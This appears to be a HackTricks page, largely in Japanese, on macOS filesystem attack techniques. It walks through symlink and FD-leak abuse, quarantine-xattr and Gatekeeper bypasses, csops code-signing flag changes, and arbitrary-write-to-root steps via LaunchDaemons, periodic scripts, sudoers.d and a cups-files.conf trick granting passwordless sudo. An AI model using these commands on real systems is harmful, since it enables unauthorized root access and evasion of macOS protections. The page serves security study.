# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

**directory** の Permissions:

- **read** - directory エントリを **enumerate** できる
- **write** - directory 内の **files** を **delete/write** でき、**empty folders** を **delete** できる。
- ただし、書き込み権限がない限り、**non-empty folders** を **delete/modify** することはできない。
- 所有者でない限り、**folder** の名前を **modify** することはできない。
- **execute** - directory を **traverse** できる。 この権限がない場合、その中のファイルや、サブディレクトリ内のファイルにアクセスできない。

### Dangerous Combinations

**root が所有する file/folder を overwrite する方法**:

- パス上の親 **directory owner** の 1 つが user である
- パス上の親 **directory owner** の 1 つが、**write access** を持つ **users group** である
- users **group** が **file** への **write** access を持っている

上記のいずれかの組み合わせにより、attacker は想定されたパスに **sym/hard link** を **inject** し、privileged な arbitrary write を取得できる可能性がある。

### Folder root R+X Special case

**root のみが R+X access を持つ directory** にファイルがある場合、それらは他の誰からも **accessible** ではない。したがって、その **restriction** により読み取れない、user が read 可能なファイルを、この folder から **different one** へ **move** できる vulnerability がある場合、これを abuse してファイルを読み取れる可能性がある。

Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

privileged process が、**lower privileged user** に **controlled** される可能性がある、または lower privileged user によって **previously created** された可能性のある **file** に data を write している場合。user は Symbolic または Hard link を使って、その file を別の file に **point** するだけでよく、privileged process はその file に write することになる。

attacker が **arbitrary write を abuse して privileges を escalate** できる可能性がある他のセクションを確認すること。

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) によると、*"`O_NOFOLLOW` が mask で使用され、`open()` に渡された target file が symbolic link の場合、`open()` は fail する。"* ただし、チェックされるのは **final** component のみであり、**intermediate** component はすべて引き続き resolve され、follow される。そのため、`O_NOFOLLOW` で write を「protected」した developer でも、target path の **parent directory** のいずれかに symlink を配置することで attack できる。

同じ man page には、この gap を実際に閉じる flags が記載されている:

- **`O_NOFOLLOW_ANY`** — *"`open()` に渡された path の ... any component が symbolic link の場合、`open()` は fail する。"*
- **`O_RESOLVE_BENEATH`** — *"指定された path resolution が fd に関連付けられた directory から escape した場合、`openat()` は fail する。"*

それ以外では、すでに validate した directory FD を基準にした `openat()`、または `realpath()` と再度の re-validation が、path の途中で発生する symlink swap を stop するために残された方法である。

## .fileloc

**`.fileloc`** extension の files は他の applications や binaries を point できるため、open されると、その application/binary が execute される。\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

`open`の呼び出しに`O_CLOEXEC`フラグがない場合、file descriptorはchild processに継承されます。そのため、privileged processがprivileged fileを開き、attackerが制御するprocessを実行すると、attackerは**privileged fileへのFDを継承**します。

典型的な例は、**OS X 10.10の`DYLD_PRINT_TO_FILE` LPE**です（[SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)）。

- `dyld`は、特定の変数が`processDyldEnvironmentVariable()`の外部でparseされていたため、**restricted（suid root）binaries**でも`DYLD_PRINT_TO_FILE=/path`を受け入れていました。
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`を実行したため、**任意のpathにroot-owned fileを作成**しました。
- FDは**一度もcloseされず、close-on-exec flagもありませんでした**。そのため、suid binaryのすべてのchildは、**root-owned fileへのwritable FD**を継承しました。
- たとえば`DYLD_PRINT_TO_FILE=/etc/target suid_binary`を実行し、childで継承されたFD番号を読み取ると、任意のroot-owned writeが可能になります。さらに`fcntl(fd, F_SETFL, 0)`によって`O_APPEND`をclearし、appendではなくoverwriteすることもできました。

同じ構造は、privileged processが、あなたが制御するものを`exec`する**前**にfileを開く場合にも現れます（helper tools、`$EDITOR`経由で起動される`crontab`形式のeditor、env-var pathから開かれるlog/debug filesなど）。継承したFDを次のコマンドで列挙できます：
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` を超える値で、自分自身では開けないファイルを指しているものは、arbitrary-write（または arbitrary-read）primitive です。

## quarantine xattrs tricks を回避する

### 削除する
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

ファイル/フォルダにこの immutable 属性が設定されている場合、そこに xattr を設定することはできません
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr サポートのないファイルシステム

macOS が mount できるすべてのファイルシステムが、**extended attributes** を native に保存できるわけではありません。HFS+ と APFS は対応していますが、**FAT32、exFAT、（大半の）NFS mount は対応していません** — macOS は `._<filename>` という名前の **AppleDouble** side file に書き込むことで、これらをエミュレートします（[The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)）。

これは quarantine に関係します。xattr は、同じ volume から実際に書き込み、**読み戻す**ことができる場合にのみ保持されるためです：
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
ボリュームが後から `._` companion を無視するパスで読み取られる場合（または companion が削除・除去された場合）、ファイルは **quarantine flag なし** で到着します。そして quarantine されていない `.app` だけで App Sandbox を抜け出すには十分です。詳細は [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) を参照してください。

### writeextattr ACL

この ACL は、ファイルへの `xattrs` の追加を防ぎます。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file formatは、ACEを含めてファイルをコピーします。

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)では、**`com.apple.acl.text`**というxattr内に保存されたACLのテキスト表現が、解凍されたファイルのACLとして設定されることを確認できます。そのため、他のxattrが書き込まれるのを防ぐACLを設定した**AppleDouble** file formatでアプリケーションをzipファイルに圧縮すると、quarantine xattrがアプリケーションに設定されません。

詳細については、[**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)を確認してください。

これを再現するには、まず正しいacl stringを取得する必要があります：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（これが機能する場合でも、sandbox は先に quarantine xattr を書き込むことに注意）

必須ではありませんが、念のため残しておきます:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## signature checks の bypass

### platform binaries checks の bypass

一部の security checks では、たとえば XPC service への接続を許可するために、binary が **platform binary** かどうかを確認します。しかし、https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ の bypass で説明されているように、platform binary（/bin/ls など）を取得し、環境変数 `DYLD_INSERT_LIBRARIES` を使用して dyld 経由で exploit を inject することで、この check を bypass できます。

### flags `CS_REQUIRE_LV` と `CS_FORCED_LV` の bypass

実行中の binary は、次のような code によって自身の flags を変更し、checks を bypass できます:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures の bypass

Bundles には **`_CodeSignature/CodeResources`** ファイルが含まれており、**bundle** 内のすべての **file** の **hash** が格納されています。なお、CodeResources の hash も **executable** に **embedded** されているため、これにも手を加えることはできません。

ただし、signature がチェックされない file もいくつかあります。これらは plist 内で `omit` key が指定されています。例:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLIからリソースの署名を計算できます：
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmgをマウントする

ユーザーは、既存のフォルダの一部にカスタム作成したdmgをマウントすることもできます。以下は、カスタムコンテンツを含むカスタムdmgパッケージを作成する方法です:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
通常、macOS は `com.apple.DiskArbitrarion.diskarbitrariond` Mach service（`/usr/libexec/diskarbitrationd` が提供）と通信してディスクを mount します。LaunchDaemons の plist ファイルにパラメータ `-d` を追加して再起動すると、ログが `/var/log/diskarbitrationd.log` に保存されます。\
ただし、`hdik` や `hdiutil` などのツールを使用して、`com.apple.driver.DiskImages` kext と直接通信することも可能です。

## Arbitrary Writes

### Periodic sh scripts

スクリプトが **shell script** として解釈される場合、毎日 trigger される **`/etc/periodic/daily/999.local`** shell script を上書きできます。

次のコマンドで、このスクリプトの実行を **fake** できます: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** のような任意の **LaunchDaemon** を、任意のスクリプトを実行する plist とともに書き込みます:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh` を、root として実行したい **commands** を含む形で生成してください。

### Sudoers File

**arbitrary write** が可能であれば、**`/etc/sudoers.d/`** 内に自分へ **sudo** 権限を付与するファイルを作成できます。

### PATH files

**`/etc/paths`** は、PATH 環境変数を設定する主な場所の1つです。上書きするには root 権限が必要ですが、**privileged process** のスクリプトがフルパスなしで **command** を実行している場合、このファイルを変更することで **hijack** できる可能性があります。

**`/etc/paths.d`** にファイルを書き込み、PATH 環境変数に新しいフォルダーを読み込ませることもできます。

### cups-files.conf

この technique は[この writeup](https://www.kandji.io/blog/macos-audit-story-part1)で使用されています。

次の内容で `/etc/cups/cups-files.conf` ファイルを作成します：
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
これにより、パーミッションが 777 のファイル `/etc/sudoers.d/lpe` が作成されます。末尾にある余分な文字列は、error log の作成をトリガーするためのものです。

次に、`/etc/sudoers.d/lpe` に `%staff ALL=(ALL) NOPASSWD:ALL` のような、privilege escalation に必要な設定を書き込みます。

その後、`/etc/cups/cups-files.conf` を再度変更し、`LogFilePerm 700` を指定します。これにより、新しい sudoers ファイルが `cupsctl` を呼び出して有効になります。

### Sandbox Escape

FS arbitrary write によって macOS sandbox から脱出できます。いくつかの例については、[macOS Auto Start](../../../../macos-auto-start-locations.md) のページを確認してください。一般的な方法の 1 つは、起動時にコマンドを実行する Terminal の preferences ファイルを `~/Library/Preferences/com.apple.Terminal.plist` に書き込み、`open` を使って呼び出すことです。

## 他のユーザーとして writable files を生成する

非常に一般的な privesc primitive は、**特権プロセスに、あなたが control できるディレクトリ内にファイルを作成させ**、そのファイルへの **write access** を維持することです。必要な要素は 2 つあります。

1. 自分が所有するディレクトリ（または **inheritable ACL** を設定できるディレクトリ）。これにより、その内部に作成されたものはすべて自分の permissions を継承します。
2. ファイルを作成する **場所** を指定できる privileged/`suid` process。通常は、debug/logging environment variable、config file、または helper の XPC API を通じて指定します。

作成されたファイルが別のユーザーによって所有されているにもかかわらず、自分による writable になるのは、**inheritable ACL** の仕組みによるものです。`file_inherit` / `directory_inherit` inheritance flags については、[`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) に記載されています。
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
現在、特権プロセスが `$DIRNAME` 内に作成するファイルはすべて、**あなたが書き込み可能**です。そのディレクトリが、後で **root として実行される**場所（`/etc/periodic/*`、`/etc/cron.d`、`/etc/sudoers.d`、LaunchDaemon のディレクトリなど）でもある場合、これは直接的な root 権限昇格につながります。ファイルを取得した後に何を書き込むべきかについては、上記の [Sudoers File](#sudoers-file) および [cups-files.conf](#cups-filesconf) セクションを参照してください。

「環境変数によって root プロセスにファイルを作成させ、その FD があなたにリークする」チェーンの完全な実例については、上記の [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) を参照してください。

## POSIX Shared Memory

**POSIX shared memory** により、POSIX 準拠のオペレーティングシステム上のプロセスは共通のメモリ領域にアクセスでき、他のプロセス間通信方式と比べて、より高速な通信が可能になります。これは、`shm_open()` で共有メモリオブジェクトを作成または開き、`ftruncate()` でサイズを設定し、`mmap()` を使用してプロセスのアドレス空間にマッピングすることで実現します。プロセスは、このメモリ領域に直接読み書きできます。並行アクセスを管理し、データ破損を防ぐために、mutex や semaphore などの同期機構がよく使用されます。最後に、プロセスは `munmap()` と `close()` で共有メモリのマッピングを解除して閉じ、必要に応じて `shm_unlink()` でメモリオブジェクトを削除します。この仕組みは、複数のプロセスが共有データに高速かつ効率的にアクセスする必要がある環境で、効率的な高速 IPC を実現するのに特に有効です。

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Consumer Code Example</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** は、ユーザーアプリケーションにおける **file descriptor operations** の安全性と信頼性を高めるために macOS に導入されたセキュリティ機能です。これらの guarded descriptors により、file descriptor に特定の制限、つまり「guards」を関連付けることができ、それらは kernel によって強制されます。

この機能は、**unauthorized file access** や **race conditions** など、特定のクラスのセキュリティ脆弱性を防止するのに特に有効です。これらの脆弱性は、例えばある thread が file description にアクセスし、**別の脆弱な thread にその file description へのアクセスを与えてしまう**場合や、file descriptor が **脆弱な child process に継承される**場合に発生します。この機能に関連する関数には、次のものがあります。

- `guarded_open_np`: guard 付きで FD を開く
- `guarded_close_np`: 閉じる
- `change_fdguard_np`: descriptor の guard flags を変更する（guard protection を解除することも可能）

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
